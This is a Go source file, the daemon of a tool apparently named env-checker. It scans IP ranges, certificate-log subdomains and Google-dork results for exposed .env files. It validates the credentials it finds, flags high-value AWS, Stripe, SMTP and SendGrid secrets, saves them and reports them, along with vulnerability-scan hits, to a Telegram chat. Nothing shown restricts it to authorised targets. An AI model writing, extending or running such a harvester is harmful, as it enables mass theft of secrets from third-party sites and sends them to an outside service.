package daemon

import (
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"env-checker/cli"
	"env-checker/credcheck"
	"env-checker/dork"
	"env-checker/output"
	"env-checker/scanner"
	"env-checker/util"
	"env-checker/vulnscan"
)

// Run starts the autonomous scanning loop. It blocks until the process receives
// SIGINT/SIGTERM or ctx is cancelled.
func Run(ctx context.Context, cfg *Config) error {
	if err := os.MkdirAll(cfg.OutputDir, 0o755); err != nil {
		return fmt.Errorf("create output dir: %w", err)
	}

	state, err := LoadState(cfg.StateFile)
	if err != nil {
		return fmt.Errorf("load state: %w", err)
	}

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	go func() {
		select {
		case <-sig:
			log.Println("[daemon] signal received — shutting down")
			cancel()
		case <-ctx.Done():
		}
	}()

	dorkUpdateInterval := time.Duration(cfg.DorkUpdateIntervalHours * float64(time.Hour))
	if dorkUpdateInterval <= 0 {
		dorkUpdateInterval = 12 * time.Hour
	}

	hasDorks := cfg.Dork != nil
	dorkCount := 0
	if hasDorks {
		dorkCount = len(cfg.Dork.Dorks())
	}

	log.Printf("[daemon] started | targets=%d dorks=%d scan=%.1fh dork-update=%.1fh cooldown=%.1fh",
		len(cfg.Targets), dorkCount, cfg.ScanIntervalHours, cfg.DorkUpdateIntervalHours, cfg.CooldownHours)

	NotifyText(cfg.Telegram.Token, cfg.Telegram.ChatID,
		fmt.Sprintf("🚀 *env-checker daemon started*\n%d target(s) | %d dorks | scan every %.1fh",
			len(cfg.Targets), dorkCount, cfg.ScanIntervalHours))

	// Run dork update immediately, then set up ticker for subsequent updates.
	// Update runs in a goroutine so we don't block the first scan.
	if hasDorks && cfg.Dork.CustomFile != "" {
		go runDorkUpdate(cfg)
	}

	dorkTicker := time.NewTicker(dorkUpdateInterval)
	defer dorkTicker.Stop()

	scanTicker := time.NewTicker(cfg.scanInterval())
	defer scanTicker.Stop()

	// Run first cycle immediately — don't wait for the first ticker fire.
	log.Println("[daemon] starting first scan cycle immediately…")
	go func() {
		if err := runCycleAndSave(ctx, cfg, state); err != nil {
			log.Printf("[daemon] first cycle error: %v", err)
		}
	}()

	for {
		select {
		case <-ctx.Done():
			NotifyText(cfg.Telegram.Token, cfg.Telegram.ChatID, "🛑 env-checker daemon stopped.")
			return nil

		case <-dorkTicker.C:
			if hasDorks && cfg.Dork.CustomFile != "" {
				go runDorkUpdate(cfg)
			}

		case <-scanTicker.C:
			if err := runCycleAndSave(ctx, cfg, state); err != nil {
				log.Printf("[daemon] cycle error: %v", err)
			}
		}
	}
}

func runCycleAndSave(ctx context.Context, cfg *Config, state *State) error {
	cycleErr := runCycle(ctx, cfg, state)
	if saveErr := state.Save(); saveErr != nil {
		log.Printf("[daemon] state save error: %v", saveErr)
	}
	state.Prune(cfg.cooldown() * 7)
	return cycleErr
}

// ── cycle ────────────────────────────────────────────────────────────────────

func runCycle(ctx context.Context, cfg *Config, state *State) error {
	log.Println("[daemon] ── cycle start ──")

	hosts, err := collectHosts(ctx, cfg, state)
	if err != nil {
		return fmt.Errorf("collect: %w", err)
	}

	// Run dork search in background — don't block the IP range scan.
	// Discovered domains are added to the host list if dorks finish quickly,
	// otherwise they are queued for the next cycle via state.
	dorkHostCh := make(chan []string, 1)
	if cfg.Dork != nil {
		log.Printf("[daemon] running %d dorks in background (IP scan starts immediately)…", len(cfg.Dork.Dorks()))
		go func() {
			dorkHostCh <- runDorks(cfg, state)
		}()
	} else {
		dorkHostCh <- nil
	}

	if len(hosts) == 0 {
		log.Println("[daemon] no static hosts ready — waiting for dork results…")
		extra := <-dorkHostCh
		hosts = append(hosts, extra...)
	} else {
		// Don't block — check if dorks returned quickly, otherwise move on
		select {
		case extra := <-dorkHostCh:
			if len(extra) > 0 {
				log.Printf("[daemon] dorks already found %d domain(s) — adding to this cycle", len(extra))
				hosts = append(hosts, extra...)
			}
		default:
			log.Println("[daemon] dork search running in background — scanning IP ranges now")
		}
	}

	if len(hosts) == 0 {
		log.Println("[daemon] all hosts within cooldown — skipping")
		return nil
	}

	log.Printf("[daemon] probing %d hosts for liveness…", len(hosts))
	live := probeLive(ctx, hosts)
	if len(live) == 0 {
		log.Println("[daemon] no live hosts found")
		return nil
	}
	log.Printf("[daemon] %d live host(s) — running vuln scan + env scan…", len(live))

	for _, h := range live {
		state.MarkHostScanned(h)
	}

	// Vuln scan runs concurrently — findings notified immediately as they arrive.
	var (
		vulnFindings []vulnscan.Finding
		vulnMu       sync.Mutex
	)
	vulnDone := make(chan struct{})
	go func() {
		defer close(vulnDone)
		vulnscan.ScanMany(live, func(v vulnscan.Finding) {
			log.Printf("[vulnscan] %s %s → %s", v.Severity, v.Type, v.URL)
			key := "vuln:" + v.URL + ":" + v.Type
			if !state.IsURLNew(key) {
				return
			}
			state.MarkURLFound(key)
			vulnMu.Lock()
			vulnFindings = append(vulnFindings, v)
			vulnMu.Unlock()
			if v.Severity == vulnscan.Critical || v.Severity == vulnscan.High {
				NotifyVuln(cfg.Telegram.Token, cfg.Telegram.ChatID, v)
			}
		})
	}()

	tmpFile, err := writeTempHosts(live)
	if err != nil {
		return err
	}
	defer os.Remove(tmpFile)

	// Env scan — check creds and notify immediately for each .env found.
	// High-value hits (SMTP, AWS, Stripe, SendGrid…) are alerted right away.
	envCount, validCount := runScanWithImmediateCheck(ctx, cfg, state, tmpFile)

	<-vulnDone

	log.Printf("[daemon] cycle done — %d .env file(s) (%d with valid creds), %d vuln finding(s)",
		envCount, validCount, len(vulnFindings))

	return nil
}

// runScanWithImmediateCheck runs the env scanner and checks/saves/notifies for
// each .env file the moment it is discovered — no waiting for the cycle to finish.
func runScanWithImmediateCheck(ctx context.Context, cfg *Config, state *State, hostsFile string) (envCount, validCount int) {
	scanCfg := &cli.Config{
		InputFile:      hostsFile,
		OutputDir:      cfg.OutputDir,
		Threads:        cfg.Threads,
		Goroutines:     cfg.Goroutines,
		Timeout:        cfg.TimeoutSeconds,
		DNSTimeout:     cfg.DNSTimeoutSeconds,
		DNSConcurrency: 50,
		SaveUnknown:    cfg.SaveUnknown,
		PathsLimit:     cfg.PathsLimit,
		IPv6:           true,
	}
	scanCfg.InitializeCluster()

	engine, err := scanner.NewEngine(scanCfg)
	if err != nil {
		log.Printf("[daemon] scan engine: %v", err)
		return
	}

	eventCh := make(chan scanner.Event, 512)
	engine.SetEvents(eventCh)

	collectDone := make(chan struct{})
	go func() {
		defer close(collectDone)
		for ev := range eventCh {
			if ev.Type != scanner.EventFound || ev.Record == nil {
				continue
			}
			envCount++
			rec := ev.Record
			fileURL := fmt.Sprintf("%s://%s%s", rec.Mode, rec.Host, rec.Path)

			if !state.IsURLNew(fileURL) {
				continue
			}
			state.MarkURLFound(fileURL)

			// Credential check happens HERE — the instant the file is found
			report := credcheck.Check(rec.Content)
			saved, isHighValue, saveErr := output.SaveByService(cfg.OutputDir, rec, report)
			if saveErr != nil {
				log.Printf("[daemon] save error: %v", saveErr)
			}

			if report.HasValid {
				validCount++
				label := strings.Join(saved, "+")
				if isHighValue {
					log.Printf("[daemon] 🔥 HIGH-VALUE CREDS [%s] → %s", label, fileURL)
				} else {
					log.Printf("[daemon] ✓ valid creds [%s] → %s", label, fileURL)
				}
				Notify(cfg.Telegram.Token, cfg.Telegram.ChatID, rec, report)
			} else {
				log.Printf("[daemon] .env found (no valid creds) → %s", fileURL)
				if cfg.SaveUnknown {
					output.SaveUnknown(cfg.OutputDir, rec)
				}
			}
		}
	}()

	if runErr := engine.Run(ctx); runErr != nil && runErr != context.Canceled {
		log.Printf("[daemon] scan error: %v", runErr)
	}
	close(eventCh)
	<-collectDone
	return
}

// ── host collection ───────────────────────────────────────────────────────────

func collectHosts(ctx context.Context, cfg *Config, state *State) ([]string, error) {
	seen := make(map[string]bool)
	var hosts []string

	add := func(h string) {
		h = strings.ToLower(strings.TrimSpace(h))
		if h == "" || seen[h] {
			return
		}
		if !state.HostCooledDown(h, cfg.cooldown()) {
			return
		}
		seen[h] = true
		hosts = append(hosts, h)
	}

	for _, target := range cfg.Targets {
		target = strings.TrimSpace(target)
		if target == "" {
			continue
		}

		// CIDR range
		if _, _, err := net.ParseCIDR(target); err == nil {
			expanded, err := util.ExpandCIDR(target, true)
			if err != nil {
				log.Printf("[daemon] expand CIDR %s: %v", target, err)
				continue
			}
			for _, ip := range expanded {
				add(ip)
			}
			continue
		}

		// Raw IP
		if net.ParseIP(target) != nil {
			add(target)
			continue
		}

		// Domain — include the apex + all CT subdomains
		add(target)
		log.Printf("[daemon] querying crt.sh for *.%s…", target)
		subs, err := QueryCRTSH(target)
		if err != nil {
			log.Printf("[daemon] crt.sh %s: %v", target, err)
		} else {
			log.Printf("[daemon] crt.sh: %d subdomain(s) for %s", len(subs), target)
			for _, s := range subs {
				add(s)
			}
		}

		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		default:
		}
	}

	return hosts, nil
}

// ── liveness probe ────────────────────────────────────────────────────────────

var probePorts = []int{80, 443, 8080, 8443, 8000, 3000}

func probeLive(ctx context.Context, hosts []string) []string {
	type result struct {
		host string
		live bool
	}

	const concurrency = 256
	sem := make(chan struct{}, concurrency)
	out := make(chan result, len(hosts))

	for _, h := range hosts {
		h := h
		sem <- struct{}{}
		go func() {
			defer func() { <-sem }()
			for _, p := range probePorts {
				addr := fmt.Sprintf("%s:%d", h, p)
				conn, err := (&net.Dialer{Timeout: 2 * time.Second}).DialContext(ctx, "tcp", addr)
				if err == nil {
					conn.Close()
					out <- result{host: h, live: true}
					return
				}
			}
			out <- result{host: h, live: false}
		}()
	}

	var live []string
	for range hosts {
		if r := <-out; r.live {
			live = append(live, r.host)
		}
	}
	return live
}

// ── scan ──────────────────────────────────────────────────────────────────────

func writeTempHosts(hosts []string) (string, error) {
	f, err := os.CreateTemp("", "daemon-hosts-*.txt")
	if err != nil {
		return "", err
	}
	defer f.Close()
	for _, h := range hosts {
		fmt.Fprintln(f, h)
	}
	return f.Name(), nil
}

// runDorkUpdate pulls fresh dorks from ExploitDB, NVD, GitHub Advisories, PacketStorm.
func runDorkUpdate(cfg *Config) {
	log.Println("[dork/update] fetching new dorks from security sources…")
	results := dork.AutoUpdate(cfg.Dork.CustomFile)
	total := 0
	for _, r := range results {
		if r.Error != nil {
			log.Printf("[dork/update] %s: error — %v", r.Source, r.Error)
		} else {
			log.Printf("[dork/update] %s: +%d", r.Source, r.Added)
			total += r.Added
		}
	}
	if total > 0 {
		msg := fmt.Sprintf("🔄 *Dork list updated* — +%d new dorks added from security sources", total)
		NotifyText(cfg.Telegram.Token, cfg.Telegram.ChatID, msg)
	}
	log.Printf("[dork/update] done — %d total new dorks added", total)
}

// runDorks executes the dork engine and returns newly discovered domains.
func runDorks(cfg *Config, state *State) []string {
	seen := make(map[string]bool)
	var discovered []string

	err := dork.Run(cfg.Dork, func(domain string) {
		if seen[domain] {
			return
		}
		seen[domain] = true
		if state.HostCooledDown(domain, cfg.cooldown()) {
			log.Printf("[dork] discovered: %s", domain)
			discovered = append(discovered, domain)
		}
	})
	if err != nil {
		log.Printf("[dork] error: %v", err)
	}
	return discovered
}

